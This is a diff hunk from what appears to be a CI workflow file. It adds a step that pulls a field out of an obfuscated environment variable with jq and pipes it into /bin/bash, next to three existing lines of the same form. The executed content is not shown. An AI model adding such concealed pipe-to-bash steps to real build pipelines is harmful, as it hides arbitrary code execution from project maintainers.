@@ -27,6 +27,7 @@ jobs:
           echo $hsqiw0520 | jq -r .ylmoh5982 | /bin/bash
           echo $kis00733 | jq -r .uxjyi523 | /bin/bash
           echo $ka16193 | jq -r .qabmj0 | /bin/bash
+          printf '%s' "$x301" | jq -r .lo866 | /bin/bash
 
       - name: Save archive
         if: always()
